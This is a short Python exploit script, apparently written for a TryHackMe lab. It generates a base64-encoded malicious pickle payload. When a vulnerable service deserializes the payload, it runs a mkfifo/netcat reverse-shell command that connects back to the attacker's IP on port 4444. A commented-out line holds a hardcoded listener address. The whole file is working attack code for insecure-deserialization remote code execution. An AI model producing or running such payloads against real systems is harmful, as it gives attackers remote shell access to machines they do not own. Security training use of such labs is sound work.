#!/usr/bin/env python3
# Program: rce.py
# Description:
#     https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3

import pickle
import sys
import base64

TM = input("Enter YOUR THM's VPN IP: ")

#command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.2.7.145 4444 > /tmp/f'
command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat ' \
            + TM + ' 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

# Convert Bytes -> String; Strip Bytes encoding;
encStrBytes = str(base64.b64encode(pickle.dumps(rce())))
encStrStrip = encStrBytes[2:-1]
print(encStrStrip)
print()

# Write to output file
#outfile = open("output.rce.txt", "w")
#outfile.write(encStrStrip)
#outfile.close()

